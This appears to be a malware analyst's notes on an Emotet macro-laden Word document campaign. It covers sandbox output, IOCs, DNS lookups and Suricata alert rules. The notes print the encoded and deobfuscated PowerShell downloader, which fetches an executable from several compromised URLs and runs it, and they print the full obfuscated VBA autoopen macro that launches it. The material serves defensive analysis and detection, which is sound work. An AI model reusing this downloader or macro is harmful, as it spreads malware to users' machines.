# Analys

- https://www.hybrid-analysis.com/sample/29782863a194cf2de02b9c873853d063d8360928b492cd033225fdd9547f7557
- Falcon Sandbox https://www.hybrid-analysis.com/sample/29782863a194cf2de02b9c873853d063d8360928b492cd033225fdd9547f7557/5db832f0038838af8d8771ba



1. [Queja__42-28-295.doc](https://www.hybrid-analysis.com/sample/d1225bb7410bb416566fe14a43675f2d9c8969f7ccffac0a16799fb0634f0955)
2. 



---

# Scanning for window names

```
"WINWORD.EXE" searching for class "MSOBALLOON"
"WINWORD.EXE" searching for class "MsoHelp10"
"WINWORD.EXE" searching for class "AgentAnim"
"WINWORD.EXE" searching for class "mspim_wnd32"
"WINWORD.EXE" searching for class "Shell_TrayWnd"
```



---

# Spawns new processes - 898.exe

```
powershell -enc PAAjACAAQQBjAHYAeQB6AHQAaABsAG4AZwB1AGsAIABoAHQA ..." (UID: 00026677-00003704, Additional Context: "<# Acvyzthlnguk https://www.microsoft.com/Gmeksgfxebvor #> $Gzfukabamep='Zvfzbcngt';$Jobtsyhz = '898';$Pcyudkca='Gopdyemsf';$Aevlejirm=$env:userprofile+'\'+$Jobtsyhz+'.exe';$Zyivwnoug='Ztuxdfjt';$Wbwrkixedmi=.('new-'+'ob'+'ject') NeT.WEBcLIEnT;$Nzmszkipocpw='https://www.sgphoto.in/cgi-bin/8qxmmq5iv-3afc88-1599/*https://zenithremit.com/wp-admin/WwTPoJ/*http://b2kish.ir/usnnttr/kyNqdhFYu/*http://topcoinfx.com/chase-login/RmegcJvg/*http://newamsterdam.pl/wp-content/rOykYRek/'."SpL`IT"('*');$Hsoqkxei='Rdvqdpyg';foreach($Bfdsagehe in $Nzmszkipocpw){try{$Wbwrkixedmi."d`OW`NLoAdFI`le"($Bfdsagehe, $Aevlejirm);$Frtepvjaagi='Ergtelqklml';If ((.('G'+'et-'+'Item') $Aevlejirm)."lE`NgtH" -ge 28349) {[Diagnostics.Process]::"sTa`Rt"($Aevlejirm);$Dtohcwavpykbo='Insfnqyx';break;$Vgdufittwfhm='Pojchjdxb'}}catch{}}$Ysfiifvs='Qxajqqisj'
```





# New ips

1. **sgphoto.in** 148.66.135.17
2. **zenithremit.com** 202.166.193.69
3. **b2kish.ir** 188.136.174.4
4. **topcoinfx.com**  # не думал, что где-то увижу свои идеи, это очень крутые люди
   1. 104.27.150.135
   2. 104.27.151.135
   3.  2606:4700:30::681b:9687
   4.  2606:4700:30::681b:9787
   5. mx*.zoho.com 
      1. mx.zoho.com 204.141.42.121 
      2. mx2.zoho.com 204.141.32.121
      3. mx3.zoho.com 204.141.42.52





---

# Domain stats



| DOMAIN                 | IP             | SAMPLE NAME            |
| ---------------------- | -------------- | ---------------------- |
| salongsmall.se         | 138.128.161.26 | CJF_774-0973418.doc    |
| dispora.ponorogo.go.id | 104.26.13.125  | CJF_774-0973418.doc    |
| test.agraria.org       | 195.130.247.41 | CJF_774-0973418.doc    |
| waed.com.au            | 166.62.27.61   | CJF_774-0973418.doc    |
| wp.myspec.com.au       | 203.28.48.8    | CJF_774-0973418.doc    |
|                        |                | INF_010051382_1029.doc |
|                        |                |                        |
|                        |                |                        |
|                        |                |                        |



---

# Suricata rules

```


alert ip any any -> 138.128.161.26 any (msg: "Emotet C2 connection (CJF_774-0973418.doc)"; sid:2019110801; rev:1;)
alert ip any any -> 104.26.13.125 any (msg: "Emotet C2 connection (CJF_774-0973418.doc)"; sid:2019110802; rev:1;)
alert ip any any -> 195.130.247.41 any (msg: "Emotet C2 connection (CJF_774-0973418.doc)"; sid:2019110803; rev:1;)
alert ip any any -> 166.62.27.61 any (msg: "Emotet C2 connection (CJF_774-0973418.doc)"; sid:2019110804; rev:1;)
alert ip any any -> 203.28.48.8 any (msg: "Emotet C2 connection (CJF_774-0973418.doc)"; sid:2019110805; rev:1;)

alert ip any any -> 148.66.135.17 any (msg: "Emotet C2 connection (Queja.doc)"; sid:201910301; rev:2;)
alert ip any any -> 202.166.193.69 any (msg: "Emotet C2 connection (Queja.doc)"; sid:201910302; rev:2;)

alert ip any any -> 188.136.174.4 any (msg: "Emotet C2 connection (Queja.doc)"; sid:201911011; rev:1;)
alert ip any any -> 104.27.150.135 any (msg: "Emotet C2 connection (Queja.doc)"; sid:201911012; rev:1;)
alert ip any any -> 104.27.151.135 any (msg: "Emotet C2 connection (Queja.doc)"; sid:201911013; rev:1;)
alert ip any any -> 2606:4700:30::681b:9687 any (msg: "Emotet C2 connection (Queja.doc)"; sid:201911014; rev:1;)
alert ip any any -> 2606:4700:30::681b:9787 any (msg: "Emotet C2 connection (Queja.doc)"; sid:201911015; rev:1;)
alert ip any any -> 204.141.42.121 any (msg: "Emotet C2 connection (Queja.doc)"; sid:201911016; rev:1;)
alert ip any any -> 204.141.32.121 any (msg: "Emotet C2 connection (Queja.doc)"; sid:201911017; rev:1;)
alert ip any any -> 204.141.42.52 any (msg: "Emotet C2 connection (Queja.doc)"; sid:201911018; rev:1;)

alert ip any any -> 111.93.13.168 any (msg: "Emotet C2 connection (69_01744.doc)"; sid:201910311; rev:1;)
alert ip any any -> 46.105.131.68 any (msg: "Emotet C2 connection (69_01744.doc)"; sid:201910312; rev:1;)

```



# Emails

1. Pantaleon61@gmail.com
2. Monika.Porebski54@yahoo.com
3. Jakubina.Sikora@gmail.com
4. Prokul.Zdunek@gmail.com
5. Filipa.Karwowski5@gmail.com
6. Marcin_Witek14@hotmail.com
7. Daniel.Witek@yahoo.com
8. Bruno59@yahoo.com
9. Beniamin.Rusin79@hotmail.com # Русин?
10. Bazej_Krakowiak@yahoo.com # кракожия? 



---



## Malicious content (C2) ("202.166.193.69"):

```
URL: http://zenithremit.com/ (AV positives: 2/71 scanned on 10/29/2019 12:38:32)
URL: http://zenithremit.com/wp-admin/WwTPoJ (AV positives: 7/72 scanned on 10/29/2019 12:30:23)
URL: http://zenithremit.com/wp-admin/WwTPoJ/ (AV positives: 7/71 scanned on 10/29/2019 12:29:06)
URL: http://zenithremit.com/wp-admin/wwtpoj (AV positives: 4/71 scanned on 10/29/2019 12:14:19)
URL: https://zenithremit.com/wp-admin/WwTPoJ (AV positives: 5/72 scanned on 10/29/2019 07:29:57)
File SHA256: b67861dbcdff6f275947379c6f7a40600f849f6661c02c46270a3468d13fffc8 (Date: 10/29/2019 11:10:02)
File SHA256: 9393992719d0f538412c885f3dfac35f421435b0e4757e170579694c33428368 (Date: 10/29/2019 08:57:39)
File SHA256: da15c19414c7930877d0e7435e231512354131c3c326e6bd1b9a59458debe623 (Date: 10/29/2019 08:55:30)
File SHA256: 7a922986ceb85ad12beff74ade07833ab5b3dbc17af312df72dee16040b02e06 (Date: 10/29/2019 08:55:14)
File SHA256: 51350c64f175b2b5ff4fde1e5c07618e04ebbafe3c69e9ae9b5a43c579927b12 (Date: 10/29/2019 08:54:49)
File SHA256: 56409488bf67f10013e7e927fcbc625c8d9388ab1592f414e64043474ca4433b (AV positives: 3/60 scanned on 09/03/2018 22:40:40)
File SHA256: 16ce845440c38f491f80553aee7a8144dcc0a82c46258deaffdd10a0fa3d2db2 (AV positives: 1/60 scanned on 06/25/2018 06:59:53)
File SHA256: 77795c8a3c5a8ff8129cb4db828828c53a590f93583fcfb0b1112a4e670c97d4 (AV positives: 1/56 scanned on 05/17/2017 21:12:46)
File SHA256: a8a284f377cb9f21c53e5553234ecb693dc4c2c38f3306b6cde4aead5e05e913 (AV positives: 2/56 scanned on 03/11/2017 14:30:24)
File SHA256: 3f4b076c87f5a32574f85aeea7c4a4f1ec4d40fd1211b8ceec60629d7a1f7d9e (AV positives: 1/55 scanned on 10/01/2016 16:25:11)
```



---



## Deobf.  and norm. spawned powershell proc.:

```powershell
<# Acvyzthlnguk https://www.microsoft.com/Gmeksgfxebvor #> $Gzfukabamep='Zvfzbcngt';
$Jobtsyhz = '898';
$Pcyudkca='Gopdyemsf';
$Aevlejirm=$env:userprofile+'\'+$Jobtsyhz+'.exe';
$Zyivwnoug='Ztuxdfjt';
$Wbwrkixedmi=.('new-'+'ob'+'ject') NeT.WEBcLIEnT;

$Nzmszkipocpw='https://www.sgphoto.in/cgi-bin/8qxmmq5iv-3afc88-1599/*https://zenithremit.com/wp-admin/WwTPoJ/*http://b2kish.ir/usnnttr/kyNqdhFYu/*http://topcoinfx.com/chase-login/RmegcJvg/*http://newamsterdam.pl/wp-content/rOykYRek/'."SpL`IT"('*');

$Hsoqkxei='Rdvqdpyg';
foreach($Bfdsagehe in $Nzmszkipocpw) {
	try {
		$Wbwrkixedmi."d`OW`NLoAdFI`le"($Bfdsagehe, $Aevlejirm);
		$Frtepvjaagi='Ergtelqklml';
		If ((.('G'+'et-'+'Item') $Aevlejirm)."lE`NgtH" -ge 28349) {
			[Diagnostics.Process]::"sTa`Rt"($Aevlejirm);
			$Dtohcwavpykbo='Insfnqyx';
			break;
			$Vgdufittwfhm='Pojchjdxb'
			}
		}
		catch {
		}
	}
$Ysfiifvs='Qxajqqisj'
```



---



## Macros src:

```vb
File "Hdgjbpgowzprh.cls" (Streampath: "Macros/VBA/Hdgjbpgowzprh") has code: ""
File "Xndlndrufhjsn.frm" (Streampath: "Macros/VBA/Xndlndrufhjsn") has code: ""
File "Riajirakrfxtu.bas" (Streampath: "Macros/VBA/Riajirakrfxtu") has code: "Function Ayhsslfnly()
On Error Resume Next
Select _
Case _
Ypryjqgft
Case _
Sghbvajbfn
Lsjvevprbljg = Quwoxgco
Xcktluissx = Hex(Zubkehihx / Rjpfrqapwdaxc)
Fhcqngxkubmm = Atn(Ghlxfskworcs - Czwzzjcbeg)
Uzueedyvqwp = Sljslovyohven
Case _
Sedfkpykbkmz
Sgkvcgxsjs = Sin(Rfszzrqgclsj)
Uahhzpblv = "13-383-48-82"
Ilguzvlnsx = Ckvinkgnafum
Ctcqgkqorf = "77-414-03-69"
Case _
Dqhvykcifw
Nbonkdqtx = Rlcqibntpzcg
Egjkogfpv = CVar(Vceoopopx)
End _
Select
Hratpdtsadb = "^_^_wi^_^_nm^_^_^_gm^_^_t^_s:^_^_Wi^_^_n3^_2^_^__P^_ro^_^_ces^_s^_"
Select _
Case _
Tlabhbrd
Case _
Sdjkidanij
Dnpuipeng = Dnxmsqgpex
Vorxnlyhjcoi = Hex(Mtbzxgbqfw / Hwcuuhrsugq)
Chjdazpzgdn = Atn(Aetfivnwd - Ohgquqgdj)
Yrmfxvratpgq = Ypyvetygeo
Case _
Yepxkevegcsc
Ediqirzdvbhh = Sin(Wsnxmewnkvf)
Cgwxvxnovyng = "Pantaleon61@gmail.com"
Viopczfhnoup = Rsnkfwwwzemk
Buzrlkae = "6a88ba65d0a4fd3f8b77479bde9ca6aca09a5dc26fe671087fcac84f1cbc0aa6"
Case _
Ddpusicfe
Dldaexyjkdrhe = Odeiumwhhchc
Bhgaeyjwqgn = CVar(Lclvloytyavw)
End _
Select
Celbfllbhidxu = Rcmzrdvxb(Rcmzrdvxb(Hdgjbpgowzprh.Yqajjxjv _
.Caption + Hdgjbpgowzprh.Pbwcfzrvr _
.Caption))
Select _
Case _
Wtlirurdjzbvh
Case _
Hmtgxpxk
Jlqoyudoycx = Xbomseeuxothp
Jjyifsijap = Hex(Xhjzerowe / Fgbvlwxh)
Ueodokgps = Atn(Hzgmopppbtdzg - Dwwmcibz)
Uvpghgmw = Gvixgirhlreik
Case _
Jtfkpfadj
Zitmrdauwioy = Sin(Qunlylldaynh)
Sfszemiinya = "Monika.Porebski54@yahoo.com"
Ppyuuyqyl = Khiviuzjskcq
Utlhgolxevo = "9af415824be14aaff1ba992f1b4709625f61b87f6e7fef60c6e928f08f25101a"
Case _
Sivrgsao
Maszqixn = Fafeqfyfm
Hgrhbwtvypa = CVar(Zhnpvphipux)
End _
Select
Select _
Case _
Wwxfxrkugl
Case _
Snbkaaltclsk
Mgidupytut = Rvbwczgkdy
Hcflhkdnkoedm = Hex(Puztigoipsfj / Kgovmvrj)
Kprbdrykzi = Atn(Dedptuptcbl - Ipizhafi)
Spmfyuujk = Cjrwbwtskjeh
Case _
Bplrhlhrwlah
Zhrbwgffrcg = Sin(Pcznhljxej)
Bmlnfwuh = "Jakubina.Sikora@gmail.com"
Crdlupvxilez = Wxswftuyazu
Slgmwjwzikwq = "8b:49:77:a1:c9:3b"
Case _
Gafxbuwq
Xcjyerdq = Cmcziqvponwg
Oxubsyybdcou = CVar(Uqgfozzuyfplz)
End _
Select
Set Raygfwkxcsmk = CreateObject(Rcmzrdvxb(Rcmzrdvxb(Rcmzrdvxb(Hdgjbpgowzprh.Zjweiiujx.Caption))))
Select _
Case _
Bjfhuhat
Case _
Xgwugxwixf
Riaxmvgqmte = Fuyfjhofdf
Fwqozkbrn = Hex(Gwuenuaebvhac / Oyxindds)
Pbmidiznysioc = Atn(Davjxvoqvw - Eesdengxsnwx)
Neguavwxk = Jjcblqmao
Case _
Fodbwdspex
Ikkbvhxhtqw = Sin(Dwgwkxyn)
Rrzzteuxjntur = "Fish"
Qsrmppsixsg = Uaxcdlsjwidd
Mhkjfeguegbp = "1a:2f:13:23:51:43"
Case _
Ibgmsbdjprqfj
Knjqwfamibhm = Rbobtbvbrlxo
Ttzvabusszmt = CVar(Ylkpdnypbdq)
End _
Select
Select _
Case _
Gcuwegpm
Case _
Exuielgld
Ixwrdfjpiju = Qktsszqdl
Robdjdjthqxfy = Hex(Bfwbykbm / Rnsddkxqxaoe)
Fabortfun = Atn(Kgjjnpbjirpqp - Apaemwzqw)
Nvypxaafsd = Kkmuxoqjm
Case _
Tptjfblqnl
Gltuppjl = Sin(Iqtzcbcfnx)
Ezdqvehnzu = "71-668-97-93"
Gietbtczk = Cpgyjohxg
Guryufdnmnlls = "8f:ba:50:15:e3:62"
Case _
Jeuudyysabofx
Xyhjbjbczwvw = Rdnelecdlwyi
Wgagouqmdjs = CVar(Cuyhbeyiy)
End _
Select
Select _
Case _
Zhezhlfw
Case _
Awljbunnex
Pyssaxxidn = Qwxjglqsbt
Tepfrthzxm = Hex(Gpkiyjjnw / Fxehsgnkwtiy)
Srjfander = Atn(Bitsjrmtkkh - Oskbumxqna)
Ahwnpafcqryu = Cwflwkewqic
Case _
Efanhmajjq
Kbkwxtqjhkbl = Sin(Wmernkoqb)
Drhsetfzqli = "Cheese"
Tomscteolcqnf = Vgtanguc
Drvllsnsexy = "ce:ad:27:3c:0e:bd"
Case _
Ohsbroreyacdk
Gtzmdbyci = Kcvaudxkesuec
Meqshbaflly = CVar(Uqfkyseoiygy)
End _
Select
Raygfwkxcsmk.ShowWindow = True And False
Select _
Case _
Tqdpokfyzmxq
Case _
Zopxyuisyjx
Opqcjagjke = Zfpbjwfi
Efhwqjbsus = Hex(Rijknqhepksvy / Qomrprdklvnk)
Rkelzogsz = Atn(Apvumlxcpkd - Binyxpag)
Xzokzznxpdcob = Yjqihxncdjq
Case _
Ukjjptyuy
Ccnneymhghzfj = Sin(Yjxkbiyf)
Ttyijvais = "Ball"
Kzyewjuav = Lluoxozoexkik
Zxlzwrszojz = "Prokul.Zdunek@gmail.com"
Case _
Zdegauhnn
Ljdbgzrnzijxo = Hslgfyivp
Ehpxalcnnnoq = CVar(Slgvpgqksmo)
End _
Select
Select _
Case _
Lnyfyylhintq
Case _
Pplyjlljtsltl
Ebbczavrwocch = Iekxudvppkicu
Fnijdmrojuty = Hex(Hidkvjginj / Lmrryblcjo)
Ulrqacafgfhbe = Atn(Wmxzypuaewsws - Asogqjsqhl)
Cgeqngdopmp = Almtifitve
Case _
Yboewpnqas
Geqpxvod = Sin(Pyfxzgzvhcpdp)
Ktwbfiirmme = "Filipa.Karwowski5@gmail.com"
Vzqltalqyyqh = Krkcplanc
Nphgtkvq = "ce:5c:70:fb:73:cb"
Case _
Imejosxl
Todxabkod = Wyjflekeo
Kecfgsatdbh = CVar(Ymjfsagnn)
End _
Select
Select _
Case _
Nunlfuodxaz
Case _
Rrssliahdglbl
Hzxxagmajsn = Pyyjmhlrk
Rlhknbjunzwy = Hex(Zpfrizxv / Eicpevxwzego)
Miitzfsa = Atn(Msfabawvq - Fyuprczyy)
Qdeaqdvoze = Clqwvzhlxjwh
Case _
Didsbxnbbbw
Sacqbtdrdb = Sin(Zqjmghxqb)
Lgdohakoat = "Marcin_Witek14@hotmail.com"
Kvsuofxzhyo = Eputylhsn
Xewqtmeljb = "Towels"
Case _
Omjkezfnrai
Pubiiwxfiw = Ggutdtffyg
Acshdsxvtee = CVar(Daeblfpy)
End _
Select
Svxxuxxbk = qkws(Hratpdtsadb, Celbfllbhidxu, Raygfwkxcsmk)
Select _
Case _
Nkutkfxzeybs
Case _
Bfljgofoar
Pivluutqbfps = Kdkqazwuvp
Yenykdpsqoe = Hex(Gzmlvqty / Bdjrdvvn)
Dwodcumcswv = Atn(Muajizzereal - Lmxvbyea)
Jiadqgxhbl = Dlmogjmroshua
Case _
Bubnmjpazyvo
Sjjeoimim = Sin(Oswqbgczlvma)
Nokmqlvajv = "e6:d9:f2:4b:81:ec"
Pmhitiktyrsjy = Ozmfjluaubvw
Njaicqprdcepe = "e48694e97c73d40105d354bd48467749df2c4fdb93796cbe8dd974998a21f710"
Case _
Vanyrgbxpynvl
Xleulisbw = Xwkbugje
Hxosllkk = CVar(Eexetkkzndzr)
End _
Select
Select _
Case _
Ccgqbpoizytei
Case _
Arolzfhwppsf
Tlxovlozq = Uuqujufbb
Wzxrufraj = Hex(Afnwqmbc / Jgfkrcfv)
Npopxqdr = Atn(Qwuuukhmd - Yrfmsshc)
Fvhnlryyzj = Sknmkqhvsrud
Case _
Jceywogwlanhi
Odjpfzuzgh = Sin(Hsnbeynivuam)
Vymzdhomen = "54-838-12-70"
Iyodyrgtzdx = Iukntcxttd
Geigvozpqq = "7b:1a:a7:23:d6:20"
Case _
Rvjgdmrbnqum
Kknuousrsnxme = Jsrfqvytrphlu
Jvbvdobwcvb = CVar(Wiqiccey)
End _
Select
End Function"
File "Dmrwehiyscd.bas" (Streampath: "Macros/VBA/Dmrwehiyscd") has code: "Function qkws(asdoqwA21, asdoqwA22, asdoqwA23)
On Error Resume Next
Select _
Case _
Jacrmmoxjow
Case _
Jtguxsanv
Lkidgaxdwig = Kshiodhhil
Sdrbqang = Hex(Cekqjqswz / Wjfkszsmidysd)
Fcgisnxfpdxxu = Atn(Mmmbwtlqxav - Cdmhcllq)
Klyephvcyvt = Fbreulihwt
Case _
Mrpuifyv
Pxpvicyx = Sin(Lrgglhqehj)
Ebdqfhppuuqd = "Tuna"
Pycfjztkrvki = Ptomoxtn
Wrhkpqadurss = "2a1f65a98874c23e52eed85d18acf5ed21d8c1674e129c0c4886a7da43edbe93"
Case _
Aozujhgx
Zbgepoabfki = Iuauhnrixrlm
Zdlmztsknkwng = CVar(Mrtivqzjnyj)
End _
Select
Set asdoqwA211 = asdoqw(asdoqwA21)
Select _
Case _
Gchiohypumq
Case _
Pqvitzicqr
Mwqacwucru = Cdcpaipcjfu
Ynuaoqllyclhp = Hex(Wjsuqgfqwsb / Uagcjdej)
Cepddarh = Atn(Zfzmzqptwyh - Jqywjylmgx)
Qadbpfkqqbo = Csnlmauqvfmf
Case _
Jaetirxiq
Gtwwshcxchgx = Sin(Wnzvuqwlxbpm)
Jwtcbtfhx = "97:a3:29:a8:56:ba"
Ykhbadcc = Exnvwvvvvg
Vofnewipopfsw = "17-374-69-42"
Case _
Jxynkkuezgg
Jmbnxzoswnzgt = Orvyqhmyxtuob
Gxrlfcnsu = CVar(Wnjzgraxphli)
End _
Select
qkws = asdoqwA211.Create(asdoqwA22, Rduyuwiosswi, asdoqwA23, Qdjwqeolcajy)
Select _
Case _
Rkgnpiocs
Case _
Vziskfwavxib
Hyofkeegiyag = Nrphrvzxsrqqy
Iijlrikaw = Hex(Morjsdgyndi / Zwkfwpugoz)
Qugocrszdik = Atn(Zmjzcdahym - Edhmhyoqsbiak)
Pbgqldwxcl = Vaisilrynk
Case _
Kvpqxejprrkgr
Thgfbbmsqk = Sin(Osnyfokf)
Gzxcqueqcal = "33-258-44-74"
Qhelvxczgoduw = Ergqtfbghyks
Hiomvxqacphno = "2d:ad:4c:32:3c:8e"
Case _
Uhtqllktvi
Bwnkfozyfoh = Cdprifrau
Qcdoxoteeip = CVar(Fczocggasji)
End _
Select
End Function
Function asdoqw(asdoqwA)
On Error Resume Next
Select _
Case _
Grayxvsc
Case _
Zgvbfjfpsnppy
Mywdfrdo = Fvqvgmtbsetil
Zoltlqsbxl = Hex(Zdgvsgcznotla / Fuidnaugcrv)
Mttkkquyli = Atn(Iwvluzsp - Hohivewdewc)
Uujbkbqulh = Ezviscngz
Case _
Cbupbheez
Aqkyinlsvh = Sin(Rfbvmuom)
Phzpmpmhd = "22-573-28-59"
Uyexttzvgrx = Dkzmsjkdwtbdy
Wgnefoxg = "956963a3cd31f94c727177527923a5a8a5b27e08dfe6f2984fd26771041d1787"
Case _
Saprgqsmbmcqa
Qlxfdtvayzad = Jfdboajvmqc
Wgzfgylpczbu = CVar(Zqrfmawsgyolo)
End _
Select
Set asdoqw = CreateObject(Rcmzrdvxb(Rcmzrdvxb(asdoqwA)))
Select _
Case _
Fdpeiigen
Case _
Hpzszdkszafxu
Ucksxlnmph = Yuewbkyfwhcv
Hvfzgutvndu = Hex(Mucjkolmyueen / Qnzoxgesh)
Qycgabgl = Atn(Txrgjdibbv - Ofaefxribvtiy)
Rtcxbkuwph = Cvqfujrkwgw
Case _
Tdjydjiwtr
Xqnujkwxjpmlp = Sin(Gcnlwgpigkxly)
Jejgwtdqnway = "39:a8:71:a1:ec:23"
Ryiekbtfg = Iigjlyxxsfhc
Gcmaowiq = "43-509-34-69"
Case _
Mphoyxeyxon
Hbxdagyjwzbez = Rojserxwr
Vbjeupvffyrti = CVar(Gqpfkzpzg)
End _
Select
End Function
Sub autoopen()
On Error Resume Next
Select _
Case _
Uthnnwtjsdj
Case _
Wusivhkiies
Dgtmkatdhlff = Kdostbcygnm
Fhmppsvtnpf = Hex(Cnpindbrz / Myspezgzklnw)
Pnywxnizlzpjy = Atn(Yygbsdrzgp - Gixortmxp)
Bskmntzubgql = Ucsynshkf
Case _
Okyplctvdej
Efgulbqxkhw = Sin(Yclmrmhvyjbe)
Wpjdkubu = "25f9fb7722e922c3656635bf9194172f812cd87d0b84c5f2ce8e13bd90fd136a"
Mzdmteccyr = Krnwavfwfqvx
Aelwsduaa = "0e01005ee967d7342772f3e5542d8abd5d4d4e1c8907c402dbbab3bc0bbce863"
Case _
Vcugzfyaef
Otgplgwegsl = Qczaxjqvoeskp
Wxocioxclo = CVar(Dnbdqrhidyzh)
End _
Select
Select _
Case _
Kobthkamxzr
Case _
Fdfjgtstjsjsk
Qoctcwbhat = Legaehfoyp
Pjtbvrawr = Hex(Ixykzevepwhg / Rflfembb)
Sdzmjtnuw = Atn(Dgxgjclxihcey - Prmbuhztsw)
Vwinkffoyn = Jpdpwpyaiwdw
Case _
Pqdmeketqazt
Tpobsssedkwcx = Sin(Ytlgpqok)
Oqqzdpdwag = "86-619-13-92"
Beocknsqc = Rrhnmdheecseb
Zvtfwyjq = "41-663-14-50"
Case _
Rmfbsvgbr
Vbqttcngjz = Gnxwwpai
Gvrbdmgmcjc = CVar(Tcmdvvki)
End _
Select
Ayhsslfnly
Select _
Case _
Fnyzhtevnr
Case _
Lcdcrgkuzac
Olsrenaptkrba = Ncjnzaxgor
Adlekibsi = Hex(Idtzsslbq / Gwrpqxre)
Pialhfhtylaby = Atn(Fafodqxdyw - Urebdiesuto)
Eisqbfypfl = Qajrfborrm
Case _
Jxttipmmtbzh
Wrrxpfhpmh = Sin(Prztvrgy)
Lehqzksp = "Ball"
Mtfxatxv = Llxhzumafhah
Fmqygwxwftow = "Chips"
Case _
Scuklmtz
Qeyrjubf = Rodypqxoge
Hkhdmqvt = CVar(Fphcyfnls)
End _
Select
Select _
Case _
Hxsqfihwz
Case _
Nlygpmmibrwn
Rrwszofgbua = Kqlrozhbej
Ntwwplkl = Hex(Rkeatnhkege / Spahnzmm)
Omujkmipzi = Atn(Bmoftuufezkrd - Ewmobjxqoye)
Vqeufuoothgss = Obdfdwetn
Case _
Pdvzgpwvjnvpm
Bkpfwihpcmvy = Sin(Rxrbjeks)
Rvwsutlq = "fb:cd:f6:0f:18:11"
Vtdhxniotn = Duspdodehir
Bloujafcify = "17-485-13-90"
Case _
Evwvzgpbsc
Pxmrdmbpt = Tujmfnuo
Ukihljlyniiop = CVar(Skesweqi)
End _
Select
End Sub
Function Rcmzrdvxb(Bwexizpx)
On Error Resume Next
Select _
Case _
Gcyuyqry
Case _
Gseuhofn
Qpdccpjfy = Efkdsbeyk
Iemomvdaatrum = Hex(Vsjgmzfxcmtqo / Pilrhyqn)
Bxvlmlyntfm = Atn(Hzchkcse - Zejjviafegs)
Klpbvduh = Edrerglj
Case _
Kvhdcdetah
Xxswuaxbug = Sin(Efdejzsw)
Sodlyryahgsuf = "24-851-10-94"
Vlkmhrekez = Akbplbaf
Ibgdtzekkzjs = "b750a5a92a7e894d81eb860fc935d6f30807b16cd368d0899ca023e5763124cc"
Case _
Hkcgoezmcry
Rhsfpjcci = Xegtpxri
Haytrzsvzpf = CVar(Ncrttjlkyfyi)
End _
Select
Select _
Case _
Gaxkvwysmybl
Case _
Dhfpcubnqe
Tygbqxpjgtd = Bjvpkiypmxn
Iersksxgcz = Hex(Hewrckezca / Yfwnzhbsg)
Ksojkihzjje = Atn(Cxknjwhi - Tewjgvyteb)
Yoburvbbwu = Lcxojjygrgve
Case _
Adlpacoqyvlpf
Spzbeyeyj = Sin(Cjustwgsuxpg)
Dudbcuem = "71-280-57-14"
Rvdiawfbfgzfw = Pimrjcif
Dbwhpppk = "Daniel.Witek@yahoo.com"
Case _
Xtxrysnb
Yywynmsu = Ipbhxviupqkua
Wkutqohta = CVar(Eyudxuuzs)
End _
Select
Xeqfzudrt = Bwexizpx
Select _
Case _
Mixmrlfzrelcf
Case _
Uwdjwnogyc
Vvivlkiq = Gegklyiq
Vpheamgiybzj = Hex(Jeiiaswhq / Zdmcpxhsmhg)
Vydasscx = Atn(Agqaprxnzpobj - Idrryadqe)
Owpxpsff = Yxsapthxptpj
Case _
Okfuxxpmno
Ybawveil = Sin(Zqjgwtotl)
Fjemlhof = "Bruno59@yahoo.com"
Dxovfxsyla = Ilpkqawxtcyys
Jjwugxwwsvlq = "Beniamin.Rusin79@hotmail.com"
Case _
Vzetgatxbrnip
Zqcncjop = Cmpwpeka
Duemrcliehxhf = CVar(Fjdtmhkxrdod)
End _
Select
Rcmzrdvxb = Replace(Xeqfzudrt, "^_", "")
Select _
Case _
Bawoktzhovite
Case _
Qsasgdwiloj
Yoypmlxfvmd = Nbenckvnhtav
Frlabhijzxsg = Hex(Ivgwdnqudxlyr / Vxubssnkmch)
Chuwsxem = Atn(Ryckonoc - Sdayfafvl)
Vcnrwdpgtyfh = Cphzwxzr
Case _
Ygwqrsjatj
Psrkzwwgmwgvc = Sin(Vowvdwbtpgyob)
Okhgzohm = "95:b5:05:57:d5:5c"
Vzycabog = Mwnrzozbdbh
Ihwnwlinbzs = "Bazej_Krakowiak@yahoo.com"
Case _
Cqpfjigbrrwqh
Gjvvaiqudns = Zlxvjblimx
Opqpaxozthrdw = CVar(Mwlrrmubgua)
End _
Select
Select _
Case _
Rlvsemvtd
Case _
Zlpxsuzvofpyh
Ttwfzeaa = Ybbspxdrneo
Mjnzmzcm = Hex(Bsbwxxqzknh / Xcyhlhuaootj)
Eobzdkozzn = Atn(Twedqtsqp - Rqftmndinam)
Iodjeydkgf = Wkxargvhakjxr
Case _
Vfnfhktvcp
Rtckksvqdg = Sin(Uqdkxegsclhft)
Mcovkiudo = "65-140-86-23"
Zfvlipwr = Hjxyiqiflwr
Jopkxnampl = "00:55:8d:55:fb:4c"
Case _
Awrdsjbpp
Rwcslycbjotm = Ezekerxzthtr
Nqvwdvyovvoo = CVar(Oqhktknjwe)
End _
Select
End Function"
File "Dtrmpbgka.bas" (Streampath: "Macros/VBA/Dtrmpbgka") has code: ""
```



---



##  Get ips:



```
➜  rns date
пятница,  1 ноября 2019 г. 03:54:58 (MSK)
➜  rns host www.sgphoto.in
www.sgphoto.in is an alias for sgphoto.in.
sgphoto.in has address 148.66.135.17
➜  rns host zenithremit.com
zenithremit.com has address 202.166.193.69
zenithremit.com mail is handled by 1 aspmx.l.google.com.
zenithremit.com mail is handled by 5 alt1.aspmx.l.google.com.
zenithremit.com mail is handled by 5 alt2.aspmx.l.google.com.
zenithremit.com mail is handled by 10 aspmx2.googlemail.com.
zenithremit.com mail is handled by 10 aspmx3.googlemail.com.
➜  rns host b2kish.ir
b2kish.ir has address 188.136.174.4
b2kish.ir mail is handled by 0 b2kish.ir.
➜  rns host topcoinfx.com
topcoinfx.com has address 104.27.150.135
topcoinfx.com has address 104.27.151.135
topcoinfx.com has IPv6 address 2606:4700:30::681b:9687
topcoinfx.com has IPv6 address 2606:4700:30::681b:9787
topcoinfx.com mail is handled by 10 mx.zoho.com.
topcoinfx.com mail is handled by 20 mx2.zoho.com.
topcoinfx.com mail is handled by 50 mx3.zoho.com.
➜  rns host newamsterdam.pl
newamsterdam.pl has address 195.88.51.148
newamsterdam.pl mail is handled by 30 ASPMX5.GOOGLEMAIL.COM.
newamsterdam.pl mail is handled by 30 ASPMX2.GOOGLEMAIL.COM.
newamsterdam.pl mail is handled by 20 ALT2.ASPMX.L.GOOGLE.COM.
newamsterdam.pl mail is handled by 30 ASPMX4.GOOGLEMAIL.COM.
newamsterdam.pl mail is handled by 10 ASPMX.L.GOOGLE.COM.
newamsterdam.pl mail is handled by 20 ALT1.ASPMX.L.GOOGLE.COM.
newamsterdam.pl mail is handled by 30 ASPMX3.GOOGLEMAIL.COM.
```

